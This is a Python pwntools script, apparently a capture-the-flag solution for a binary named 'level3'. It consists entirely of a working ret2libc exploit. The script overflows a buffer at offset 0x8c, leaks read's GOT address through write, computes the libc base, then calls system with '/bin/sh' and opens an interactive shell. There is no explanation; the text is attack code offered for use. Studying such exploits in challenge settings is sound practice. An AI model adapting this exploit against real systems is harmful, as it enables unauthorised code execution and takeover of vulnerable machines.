from pwn import *

#context.log_level = 'debug'

#n = process('./level3')
#n = remote('pwn2.jarvisoj.com', 9879)
n = remote("localhost",12345)

elf = ELF('./level3')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('./libc-2.19.so')

offset = 0x8c

read_got = elf.got['read']
write_plt = elf.plt['write']
vuln_addr = elf.symbols['vulnerable_function']

payload1 = 'a' * offset + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(read_got) + p32(4)

n.recvuntil("Input:\n")
n.sendline(payload1)

read_addr = u32(n.recv(4))

libcbase = read_addr - libc.symbols['read']

sys_addr = libcbase + libc.symbols['system']
sh_addr = libcbase + libc.search("/bin/sh").next()

n.recvuntil('Input:\n')
payload2 = 'a' * offset + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
n.sendline(payload2)
n.interactive()

